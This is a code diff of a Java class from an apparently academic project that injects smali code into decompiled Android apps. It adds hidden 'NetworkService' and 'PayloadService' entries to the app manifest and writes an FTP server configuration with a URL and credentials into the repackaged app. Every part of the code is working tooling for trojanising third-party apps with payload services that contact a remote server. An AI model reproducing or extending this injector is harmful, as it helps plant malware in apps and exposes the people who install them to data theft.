@@ -4,6 +4,8 @@
 
 package it.unisannio.srss.dame.injection;
 
+import it.unisannio.srss.dame.android.services.NetworkService;
+import it.unisannio.srss.dame.android.services.PayloadService;
 import it.unisannio.srss.dame.model.FTPServerConfig;
 import it.unisannio.srss.utils.DirectoryCopier;
 import it.unisannio.srss.utils.FileUtils;
@@ -39,18 +41,9 @@ public class CommonInjector {
 	 */
 	public static void injectSmali(Path commonSmaliSource, Path appSmaliPath)
 			throws IOException {
-		// XXX il metodo Files.notExists non è ideale per verificare se un file
-		// non esiste perché restituisce false se non è possibile accedere alla
-		// directory. Il controllo è stato sostituito.
 		FileUtils.checkDir(commonSmaliSource.toFile());
 		FileUtils.checkDirForWriting(appSmaliPath.toFile(),false);
-//		if (Files.notExists(commonSmaliSource) || Files.notExists(appSmaliPath)) {
-//			String msg = "Common smali source or app smali source directory doesn't exist";
-//			LOG.error(msg);
-//			throw new FileNotFoundException(msg);
-//		}
-
-		LOG.info("Start coping common smali from "
+		LOG.info("Start copying common smali from "
 				+ commonSmaliSource.toString() + " to "
 				+ appSmaliPath.toString());
 		try {
@@ -59,37 +52,28 @@ public class CommonInjector {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
-		LOG.info("End coping common smali code");
+		LOG.info("End copying common smali code");
 	}
 
 	/**
 	 * Inietta nel manifesto una serie di servizi
 	 * 
-	 * @param manifestPath
-	 *            il path del file che rappresenta il manifesto
-	 * @param services
-	 *            la lista di servizi che si vuole iniettare
+	 * @param appSmaliPath
 	 * @return <code>true</code> se l'operazione è andata a buon fine,
 	 *         <code>false</code> altrimenti.
 	 * @throws FileNotFoundException
 	 *             se il path che viene indicato e' errato
 	 */
-	public static boolean injectServices(Path manifestPath, String... services)
+	public static boolean injectServices(Path appSmaliPath)
 			throws FileNotFoundException {
-		// TODO manca la modifica del manifest: bisogna (1) aggiungere i servizi
-		// al manifest e (2) aggiungere i permessi necessari ai payload scelti
-		// dall'utente.
-		if (!manifestPath.endsWith(manifestName)) {
-			String msg = "Manifest not found";
-			LOG.error(msg);
-			throw new FileNotFoundException(msg);
-		}
-
 		LOG.info("Start adding service to manifest");
-		File manifest = manifestPath.toFile();
+		File manifest = FileUtils.checkFile(new File(appSmaliPath.toFile(),
+				manifestName));
 		ManifestManipulator manifestManipulator = new ManifestManipulator(
 				manifest);
-		manifestManipulator.addServices(services);
+		manifestManipulator.addServices(
+				NetworkService.class.getCanonicalName(),
+				PayloadService.class.getCanonicalName());
 		boolean ret = manifestManipulator.writeOutputManifest();
 		LOG.info("End adding service to manifest");
 
@@ -116,13 +100,12 @@ public class CommonInjector {
 	 * @throws IOException
 	 */
 	public static void injectFtpConfig(Path appSmaliPath, FTPServerConfig serverConfig) throws IOException {
-		// TODO manca la generazione del file che contiene url e credenziali del
-		// server ftp.
-		// assumi che tutte queste informazioni vengono passate come parametri
+		LOG.info("Generating FTP server configuration.");
 		Path config = Paths.get(appSmaliPath.toString(), "unknown", "it",
 				"unisannio", "srss", "dame", "android", CONFIG_FILE);
 		
 		serverConfig.writeToFile(config.toFile());
+		LOG.info("FTP configuration generated");
 
 	}
 }
